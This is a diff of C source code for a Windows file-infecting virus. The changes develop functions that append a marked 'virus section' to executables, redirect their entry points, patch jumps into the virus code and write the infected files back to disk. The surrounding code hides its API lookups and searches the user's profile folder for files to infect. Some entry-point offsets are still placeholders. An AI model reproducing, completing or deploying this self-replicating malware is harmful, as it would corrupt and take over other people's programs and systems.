@@ -7,15 +7,17 @@ BYTE WINAPI IsValidExecutable(const PVOID file_data);
 BYTE WINAPI Is64BitExecutable(const PVOID file_data);
 BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);
 
-PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, const PVOID section_data, DWORD size, PDATA data);
-void AdjustEntryPoint(PDATA data);
-void ModifyJumpInstructionToVirusCode(PDATA data);
+PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, PDATA data);
+void SetEntryPoint(PVOID data, DWORD new_entry_point);
+void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);
 
 void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
 
 void WINAPI InfectFile(PSTR file_name, PDATA data);
 void WINAPI InfectUserProfile(PDATA data);
 void WINAPI FindFile(PSTR directory, PDATA data);
+
+int main();
 
 DWORD Align(DWORD value, DWORD alignment)
 {
@@ -109,7 +111,7 @@ BYTE WINAPI IsVirusExistedInFile(const PVOID file_data)
 
 }
 
-PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, const PVOID section_data, DWORD section_size, PDATA data)
+PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, PDATA data)
 {
     PIMAGE_DOS_HEADER p_image_dos_header;
     PIMAGE_SECTION_HEADER p_image_section_header;
@@ -130,6 +132,7 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, c
         p_image_nt_headers_64->OptionalHeader.SizeOfImage = Align(Align(
         p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
         p_image_nt_headers_64->OptionalHeader.CheckSum = 0;
+        p_image_nt_headers_64->OptionalHeader.LoaderFlags = VIRUS_FLAG;
 
     }
     else
@@ -144,11 +147,12 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, c
         p_image_nt_headers_32->OptionalHeader.SizeOfImage = Align(Align(
         p_image_section_header[i-1].VirtualAddress + p_image_section_header[i-1].Misc.VirtualSize, section_alignment) + section_size, section_alignment);
         p_image_nt_headers_32->OptionalHeader.CheckSum = 0;
+        p_image_nt_headers_32->OptionalHeader.LoaderFlags = VIRUS_FLAG;
     }
 
     ZeroMem(&p_image_section_header[i], sizeof(IMAGE_SECTION_HEADER));
 
-    p_image_section_header[i].Characteristics = IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE;
+    p_image_section_header[i].Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA;
 
     p_image_section_header[i].PointerToRawData = Align(
         (DWORD)(p_image_section_header[i-1].PointerToRawData + p_image_section_header[i-1].SizeOfRawData),
@@ -177,6 +181,8 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, DWORD file_size, c
 
     MemCopy((unsigned char *)file_data + p_image_section_header[i].PointerToRawData, section_data, section_size);
 
+    *(DWORD*)file_size = Align(*(DWORD *)file_size, file_alignment);
+
     return &p_image_section_header[i];
 }
 
@@ -188,6 +194,8 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
     DWORD file_alignment, section_alignment;
     ULONG number_of_sections;
 
+    DWORD entry_address = 0;
+
     char virus_name[6];
 
     p_image_dos_header = (PIMAGE_DOS_HEADER)mem_data;
@@ -197,7 +205,7 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
         p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
         p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_64 + 1);
         number_of_sections = p_image_nt_headers_64->FileHeader.NumberOfSections;
-
+        entry_address = p_image_nt_headers_64->OptionalHeader.AddressOfEntryPoint;
     }
     else
     {
@@ -205,19 +213,14 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
         p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
         p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_32 + 1);
         number_of_sections = p_image_nt_headers_32->FileHeader.NumberOfSections;
+        entry_address = p_image_nt_headers_32->OptionalHeader.AddressOfEntryPoint;
 
     }
 
-    virus_name[0] = '.';
-    virus_name[1] = 'h';
-    virus_name[2] = 'i';
-    virus_name[3] = 'e';
-    virus_name[4] = 'u';
-    virus_name[5] = 0;
-
     for (int i = 0; i < number_of_sections; i++)
     {
-        if (StrCmp(p_image_section_header[i].Name, virus_name) == 1)
+        if (p_image_section_header[i].VirtualAddress <= entry_address && 
+            entry_address <= p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize)
         {
             return &p_image_section_header[i];
         }
@@ -226,22 +229,65 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
 
 }
 
-void AdjustEntryPoint(PDATA data)
+DWORD GetEntryPoint(PVOID data)
 {
+    PIMAGE_DOS_HEADER p_image_dos_header;
+
+    p_image_dos_header = (PIMAGE_DOS_HEADER)data;
+    if (Is64BitExecutable(data))
+    {
+        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
+        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)data + p_image_dos_header->e_lfanew);
+        return p_image_nt_headers_64->OptionalHeader.AddressOfEntryPoint;
+
+    }
+    else
+    {
+        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
+        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)data + p_image_dos_header->e_lfanew);
+        return p_image_nt_headers_32->OptionalHeader.AddressOfEntryPoint;
+    }
+
+}
+
+
+void SetEntryPoint(PVOID data, DWORD new_entry_point)
+{
+    PIMAGE_DOS_HEADER p_image_dos_header = (PIMAGE_DOS_HEADER)data;
+    if (Is64BitExecutable(data))
+    {
+        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
+        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)data + p_image_dos_header->e_lfanew);
+        p_image_nt_headers_64->OptionalHeader.AddressOfEntryPoint = new_entry_point;
+
+    }
+    else
+    {
+        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
+        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)data + p_image_dos_header->e_lfanew);
+        p_image_nt_headers_32->OptionalHeader.AddressOfEntryPoint = new_entry_point;
+    }
     return;
 }
 
-void ModifyJumpInstructionToVirusCode(PDATA data)
+void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress)
 {
+    if ( *((PUCHAR)data + entry_point) != 0xe9 )
+    {
+        return;
+    }
+    *(PDWORD)((PUCHAR)data + entry_point + 1) = main_addrress - (entry_point + 5);
     return;
 }
 
 void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size)
 {
-    PVOID section_data;
-    DWORD section_size;
-
+    PVOID section_data = NULL;
+    DWORD section_size = 0;
+    DWORD virus_section_va = 0;
     PIMAGE_SECTION_HEADER virus_section = GetCurrentVirusSection(data->this_file_base_address);
+
+    virus_section_va = virus_section->VirtualAddress;
     section_size = virus_section->SizeOfRawData;
     section_data = data->iat->fnVirtualAlloc(
         NULL, 
@@ -250,24 +296,39 @@ void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD
         PAGE_READWRITE
     );
 
-    MemCopy(section_data, (virus_section->VirtualAddress), section_size);
+    MemCopy(section_data, (PUCHAR)data->this_file_base_address + virus_section_va, section_size);
 
-    AddVirusSection(file_data, file_size, section_data, section_size, data);
+    ModifyJumpInstructionToVirusCode(section_data, GetEntryPoint(data->this_file_base_address) - virus_section_va, (DWORD)((DWORD)&main - (DWORD)data->this_file_base_address) - virus_section_va);
+
+    PIMAGE_SECTION_HEADER virus_section_in_target = AddVirusSection(file_data, &file_size, section_data, section_size, data);
+
+    if (Is64BitExecutable(file_data))
+    {
+        DWORD entry_point_64bit = 0x41414141;
+        SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + entry_point_64bit);
+    }
+    else
+    {
+        DWORD entry_point_32bit = 0x41414141;
+        SetEntryPoint(file_data, virus_section_in_target->VirtualAddress + entry_point_32bit);
+    }
 
     data->iat->fnVirtualFree(
-        section_size,
+        section_data,
         0, 
         MEM_RELEASE
     );
 
-    new_file_size = file_size + section_size;
+    *(DWORD*)new_file_size = file_size + section_size;
     return;
 }
 
 void WINAPI InfectFile(PSTR file_name, PDATA data)
 {
     HANDLE handle_file;
-    ULONG file_size, new_file_size, section_size, bytes_read;
+    HANDLE handle_mapped_file;
+    PVOID mapped_file_address;
+    ULONG file_size, new_file_size, bytes_read;
     PVOID file_data = NULL;
     DWORD number_of_bytes_written = 0;
 
@@ -286,11 +347,11 @@ void WINAPI InfectFile(PSTR file_name, PDATA data)
     }
 
     file_size = data->iat->fnGetFileSize(handle_file, NULL);
-    new_file_size = file_size + 0x100000;
+    new_file_size = file_size;
     
     file_data = data->iat->fnVirtualAlloc(
         NULL, 
-        new_file_size, 
+        file_size + 0x1000000, 
         MEM_COMMIT|MEM_RESERVE,
         PAGE_READWRITE
     );
@@ -312,7 +373,19 @@ void WINAPI InfectFile(PSTR file_name, PDATA data)
 
     AddVirusToFile(file_data, file_size, data, &new_file_size);
 
-    data->iat->fnWriteFile(handle_file, file_data, new_file_size, number_of_bytes_written, NULL);
+    handle_mapped_file = data->iat->fnCreateFileMappingA(handle_file, NULL, PAGE_READWRITE, 0, new_file_size, NULL);
+    if (!handle_mapped_file)
+    {
+        goto END_FUNCTION;
+    }
+
+    mapped_file_address = data->iat->fnMapViewOfFile(handle_mapped_file, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+
+    MemCopy(mapped_file_address, file_data, new_file_size);
+    
+    data->iat->fnFlushViewOfFile(mapped_file_address,0);
+    data->iat->fnUnmapViewOfFile(mapped_file_address);
+    data->iat->fnCloseHandle(handle_mapped_file);
 
     END_FUNCTION:
     if (handle_file != NULL)
@@ -376,6 +449,9 @@ void WINAPI FindFile(PSTR directory, PDATA data)
 
 void WINAPI InfectUserProfile(PDATA data)
 {
+    InfectFile("E:\\Code\\C++\\1.exe", data);
+    return;
+
     char user_profile[1024];
     char user_profile_str[12];
     user_profile_str[0] = 'u'; 
@@ -394,6 +470,11 @@ void WINAPI InfectUserProfile(PDATA data)
     FindFile(user_profile, data);
 }
 
+void EmptyFunction()
+{
+    return;
+}
+
 int main()
 {
     IAT iat;
@@ -401,6 +482,7 @@ int main()
     data.iat = &iat;
     GetFunctionAddress(&data);
     InfectUserProfile(&data);
+    return 0;
 }
 
 void GetFunctionAddress(PDATA data)
